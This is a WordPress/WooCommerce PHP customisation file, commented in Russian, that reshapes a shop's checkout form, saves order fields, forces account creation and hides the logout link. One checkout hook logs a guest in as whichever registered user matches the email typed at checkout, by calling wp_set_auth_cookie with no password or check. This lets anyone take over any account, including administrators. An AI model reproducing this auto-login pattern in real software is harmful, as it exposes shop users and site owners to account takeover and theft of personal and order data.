<?php
//текст кнопки "Подтвердить заказ"
add_filter('woocommerce_order_button_text', function() {
    return 'Перейти к оплате';
});

//Скрываем чекаут, если корзина пустая
add_action('wp_footer', function() {
    ?>
    <script>
        jQuery(document).ready(function($) {
            function toggleCheckout() {
                if ($('.cart-empty').length) {
                    $('body').addClass('empty-cart');
                } else {
                    $('body').removeClass('empty-cart');
                }
            }
            toggleCheckout();
            $(document.body).on('updated_cart_totals', toggleCheckout);
        });
    </script>

    <script>
        jQuery(function($) {
            $('body').on('change', '.qty', function() {
                $('[name="update_cart"]').trigger('click');
            });
        });
    </script>
    <?php
});


//настраиваем поля формы
add_filter('woocommerce_checkout_fields', function ($fields) {
    // Убираем ненужные стандартные поля
//  unset( $fields['shipping'] );
    unset($fields['billing']['billing_company']);
    unset($fields['billing']['billing_address_2']);
    unset($fields['billing']['billing_postcode']);
    unset($fields['billing']['billing_state']);
    unset($fields['billing']['billing_apartment']);
    unset($fields['billing']['billing_country']);
    unset($fields['billing']['billing_last_name']);

    unset($fields['shipping']['shipping_company']);
    unset($fields['shipping']['shipping_address_2']);
    unset($fields['shipping']['shipping_postcode']);
    unset($fields['shipping']['shipping_state']);
    unset($fields['shipping']['shipping_country']);
    unset($fields['shipping']['shipping_last_name']);
    unset($fields['order']['order_comments']);

    // Переименовываем стандартные поля и задаем приоритеты
    $fields['billing']['billing_first_name']['label'] = 'ФИО';
    $fields['billing']['billing_first_name']['placeholder'] = '';
    $fields['billing']['billing_first_name']['class'] = ['form-row-wide'];
    $fields['billing']['billing_first_name']['priority'] = 10;

    // ФИО (сливаем имя и фамилию)
    $fields['shipping']['shipping_first_name'] = [
        'label' => 'ФИО',
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 10,
    ];

    $fields['billing']['billing_phone']['label'] = 'Телефон';
    $fields['billing']['billing_phone']['placeholder'] = '';
    $fields['billing']['billing_phone']['priority'] = 20;

    $fields['shipping']['shipping_phone'] = [
        'label' => 'Телефон',
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 20,
    ];

    $fields['billing']['billing_email']['label'] = 'Email';
    $fields['billing']['billing_email']['placeholder'] = '';
    $fields['billing']['billing_email']['priority'] = 30;

    $fields['shipping']['shipping_email'] = [
        'label' => 'Email',
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 30,
    ];

    $fields['billing']['billing_city']['label'] = 'Город';
    $fields['billing']['billing_city']['placeholder'] = '';
    $fields['billing']['billing_city']['priority'] = 40;

    $fields['shipping']['shipping_city'] = [
        'label' => 'Город',
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 40,
    ];

    $fields['billing']['billing_address_1']['label'] = 'Улица';
    $fields['billing']['billing_address_1']['placeholder'] = '';
    $fields['billing']['billing_address_1']['priority'] = 50;

    $fields['shipping']['shipping_address_1'] = [
        'label' => 'Улица',
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 50,
    ];



    // Добавляем поле "Квартира"
    $fields['billing']['billing_address_2'] = [
        'label' => 'Квартира',
        'required' => true,
        'class' => ['form-row-wide'],
        'clear' => true,
        'priority' => 60,
    ];

    $fields['shipping']['shipping_address_2'] = [
        'label' => 'Квартира',
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 60,
    ];


    // Добавляем поле "Способ доставки"
    $fields['billing']['billing_shipping_method'] = [
        'label' => 'Способ доставки',
        'type' => 'select',
        'options' => [
            'courier' => 'Курьер',
            'pickup' => 'Самовывоз',
        ],
        'required' => true,
        'class' => ['form-row-wide shipping_method'],
        'priority' => 70,
    ];

    $fields['shipping']['shipping_shipping_method'] = [
        'label' => 'Способ доставки',
        'type' => 'select',
        'options' => [
            'courier' => 'Курьер',
            'pickup' => 'Самовывоз',
        ],
        'required' => false,
        'class' => ['form-row-wide'],
        'priority' => 70,
    ];

//    $fields['billing']['billing_comments'] = [
//        'placeholder' => 'Комментарий к заказу',
//        'type' => 'textarea',
//        'required' => false,
//        'class' => ['form-row-wide row-textarea'],
//        'priority' => 80,
//    ];

//     Комментарий к заказу
    $fields['order']['order_comments']['placeholder'] = 'Комментарий к заказу';
    $fields['order']['order_comments']['priority'] = 80;

    return $fields;
});

//убрать label
add_filter('woocommerce_form_field_args', function ($args, $key) {
    if ($key === 'billing_comments') {
        $args['label'] = false;
    }
    return $args;
}, 10, 2);

//сохраняем поля формы
add_action('woocommerce_checkout_update_order_meta', function ($order_id) {
    if (!empty($_POST['billing_phone'])) {
        update_post_meta($order_id, 'billing_phone', sanitize_text_field($_POST['billing_phone']));
    }
    if (!empty($_POST['billing_email'])) {
        update_post_meta($order_id, 'billing_email', sanitize_text_field($_POST['billing_email']));
    }
    if (!empty($_POST['billing_city'])) {
        update_post_meta($order_id, 'billing_city', sanitize_text_field($_POST['billing_city']));
    }
    if (!empty($_POST['billing_address_1'])) {
        update_post_meta($order_id, 'billing_address_1', sanitize_text_field($_POST['billing_address_1']));
    }
    if (!empty($_POST['billing_address_2'])) {
        update_post_meta($order_id, 'billing_address_2', sanitize_text_field($_POST['billing_address_2']));
    }
    if (!empty($_POST['billing_shipping_method'])) {
        update_post_meta($order_id, 'billing_shipping_method', sanitize_text_field($_POST['billing_shipping_method']));
    }
    if (!empty($_POST['billing_comments'])) {
        update_post_meta($order_id, 'billing_comments', sanitize_text_field($_POST['billing_comments']));
    }

    // Сохраняем данные для shipping
    if (!empty($_POST['shipping_full_name'])) {
        update_post_meta($order_id, 'shipping_full_name', sanitize_text_field($_POST['shipping_full_name']));
    }
    if (!empty($_POST['shipping_phone'])) {
        update_post_meta($order_id, 'shipping_phone', sanitize_text_field($_POST['shipping_phone']));
    }
    if (!empty($_POST['shipping_email'])) {
        update_post_meta($order_id, 'shipping_email', sanitize_text_field($_POST['shipping_email']));
    }
    if (!empty($_POST['shipping_city'])) {
        update_post_meta($order_id, 'shipping_city', sanitize_text_field($_POST['shipping_city']));
    }
    if (!empty($_POST['shipping_address_1'])) {
        update_post_meta($order_id, 'shipping_address_1', sanitize_text_field($_POST['shipping_address_1']));
    }
    if (!empty($_POST['shipping_address_2'])) {
        update_post_meta($order_id, 'shipping_address_2', sanitize_text_field($_POST['shipping_address_2']));
    }
    if (!empty($_POST['shipping_shipping_method'])) {
        update_post_meta($order_id, 'shipping_shipping_method', sanitize_text_field($_POST['shipping_shipping_method']));
    }
    if (!empty($_POST['shipping_comments'])) {
        update_post_meta($order_id, 'shipping_comments', sanitize_text_field($_POST['shipping_comments']));
    }
});

add_action( 'woocommerce_thankyou', 'show_password_email_message_for_new_users', 10, 1 );

function show_password_email_message_for_new_users( $order_id ) {
    $order = wc_get_order( $order_id );
    if ( $order->get_user_id() === 0 ) {
        $user_email = $order->get_billing_email();
        echo '<p class="woocommerce-message text-center font-xl font-bold">Спасибо за заказ! Ваш пароль для входа в личный кабинет - был выслан на указанный email: ' . esc_html( $user_email ) . '.</p>';
    }
}

//remove_action( 'woocommerce_checkout_login_form', 'woocommerce_checkout_login_form', 10 );



//remove_action('woocommerce_checkout_order_review', 'woocommerce_order_review', 10);
add_filter('woocommerce_order_review_heading', '__return_empty_string');
//remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);
remove_action('woocommerce_checkout_terms_and_conditions', 'wc_checkout_privacy_policy_text', 20);
remove_action('woocommerce_checkout_terms_and_conditions', 'wc_terms_and_conditions_page_content', 30);


function remove_logout_link_from_my_account( $items ) {
    if( isset( $items['customer-logout'] ) ) {
        unset( $items['customer-logout'] );
    }
    return $items;
}
add_filter( 'woocommerce_account_menu_items', 'remove_logout_link_from_my_account' );


//Если пользователь с таким email уже зарегистрирован:
//
//WooCommerce не создаст новый аккаунт.
//
//Пользователь получит сообщение: "Пользователь с таким email уже зарегистрирован. Пожалуйста, войдите."
//
//Или (второй хук) автоматически залогинится.
//
//Если пользователя с таким email нет, WooCommerce создаст новый аккаунт.
add_action('woocommerce_after_checkout_validation', function ($data, $errors) {
    if (!is_user_logged_in()) {
        $email = sanitize_email($data['billing_email']);
        $user = get_user_by('email', $email);

        if ($user) {
            // Если пользователь с таким email уже существует, останавливаем создание нового
            $errors->add('registration_error', 'Пользователь с таким email уже зарегистрирован. Пожалуйста, войдите в систему.');
        }
    }
}, 10, 2);

add_action('woocommerce_checkout_process', function () {
    if (!is_user_logged_in() && isset($_POST['billing_email'])) {
        $email = sanitize_email($_POST['billing_email']);
        $user = get_user_by('email', $email);

        if ($user) {
            // Логиним пользователя автоматически, если email уже зарегистрирован
            wp_set_auth_cookie($user->ID);
            WC()->session->set('customer_id', $user->ID);
        }
    }
});

add_action('wp_footer', 'force_checkout_create_account_js');
function force_checkout_create_account_js() {
    if (!is_user_logged_in() && is_checkout() && !is_wc_endpoint_url()) :
        ?>
        <script>
            (function($){
                $(document).ready(function(){
                    let $createAccount = $('input[name=createaccount]');
                    if ($createAccount.length) {
                        $createAccount.prop('checked', true).trigger('change'); // Делаем активным и вызываем событие
                    }
                });
            })(jQuery);
        </script>
    <?php
    endif;
}


add_filter('woocommerce_add_error', function ($error) {
    return str_replace('Платежи', 'Поле', $error);
});
